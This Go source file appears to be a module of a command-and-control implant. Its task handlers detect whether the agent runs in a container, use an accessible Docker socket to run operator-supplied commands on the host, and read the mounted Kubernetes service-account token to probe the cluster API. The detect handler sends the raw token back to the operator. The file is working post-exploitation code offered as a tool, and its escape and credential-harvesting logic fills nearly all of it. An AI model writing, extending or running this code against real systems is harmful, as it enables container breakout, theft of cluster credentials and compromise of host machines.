//go:build linux || windows || darwin

package main

import (
	"encoding/json"
	"fmt"
	"strings"
)

func handleContainerDetect(task Task, res *TaskResult) {
	runtime, inContainer := DetectContainer()
	hasDocker := CheckDockerSocket()
	hasK8s, saToken := CheckK8sServiceAccount()
	ns := GetK8sNamespace()
	cid := GetContainerID()

	data := map[string]interface{}{
		"in_container":   inContainer,
		"runtime":        runtime,
		"container_id":   cid,
		"docker_socket":  hasDocker,
		"k8s_token":      hasK8s,
		"k8s_namespace":  ns,
		"k8s_token_data": saToken,
	}
	jsonData, _ := json.Marshal(data)
	res.Output = string(jsonData)
	res.Encoding = "json"
}

func handleContainerEscape(task Task, res *TaskResult) {
	runtime, inContainer := DetectContainer()
	if !inContainer {
		res.Error = "not running inside a container"
		return
	}

	hasDocker := CheckDockerSocket()
	hasK8s, saToken := CheckK8sServiceAccount()
	ns := GetK8sNamespace()

	var sb strings.Builder
	sb.WriteString("=== Container Escape Assessment ===\n")
	sb.WriteString(fmt.Sprintf("runtime: %s\n", runtime))
	sb.WriteString(fmt.Sprintf("docker socket: %v, k8s token: %v (ns=%s)\n", hasDocker, hasK8s, ns))
	sb.WriteString("\n")

	anyVector := false
	if hasDocker {
		anyVector = true
		sb.WriteString("[+] docker socket accessible - executing escape\n")
		out, err := escapeDockerSocket(escapePayload(task))
		if err != nil {
			sb.WriteString("[-] docker escape failed: " + err.Error() + "\n")
		} else {
			sb.WriteString(out + "\n")
		}
	}
	if hasK8s && saToken != "" {
		anyVector = true
		sb.WriteString("[+] k8s service account token present - probing API\n")
		out, err := probeKubernetesAPI(saToken, ns)
		if err != nil {
			sb.WriteString("[-] k8s probe failed: " + err.Error() + "\n")
		} else {
			sb.WriteString(out + "\n")
		}
	}
	if !anyVector {
		sb.WriteString("[-] no obvious escape vectors detected (no docker socket, no k8s token)\n")
		sb.WriteString("    check for: privileged mode, mounted host paths, cgroup escapes\n")
	}

	res.Output = strings.TrimSpace(sb.String())
	if !anyVector {
		res.Error = "no escape vectors found"
	}
}

func handleContainerDocker(task Task, res *TaskResult) {
	runtime, inContainer := DetectContainer()
	if !inContainer {
		res.Error = "not running inside a container"
		return
	}
	if !CheckDockerSocket() {
		res.Error = "docker socket not accessible at /var/run/docker.sock"
		return
	}

	out, err := escapeDockerSocket(escapePayload(task))
	if err != nil {
		res.Error = err.Error()
		return
	}
	_ = runtime
	res.Output = out
}

func handleContainerK8s(task Task, res *TaskResult) {
	runtime, inContainer := DetectContainer()
	if !inContainer {
		res.Error = "not running inside a container"
		return
	}

	hasK8s, saToken := CheckK8sServiceAccount()
	ns := GetK8sNamespace()
	if !hasK8s || saToken == "" {
		res.Error = "no k8s service account token mounted"
		return
	}

	out, err := probeKubernetesAPI(saToken, ns)
	if err != nil {
		res.Error = err.Error()
		return
	}
	_ = runtime
	res.Output = out
}

// escapePayload returns the operator-supplied command to run on the host
// filesystem, defaulting to a harmless id/hostname fingerprint.
func escapePayload(task Task) string {
	if p := strings.TrimSpace(task.Data); p != "" {
		return p
	}
	if p := strings.TrimSpace(task.Command); p != "" && !isDefaultContainerCommand(p) {
		return p
	}
	return "id; hostname; uname -a"
}

func isDefaultContainerCommand(p string) bool {
	// Commands that were previously used as informational flags (detect / check
	// verbs) are not valid shell payloads; treat them as "no payload".
	switch p {
	case "detect", "check", "scan", "escape", "run":
		return true
	}
	return false
}
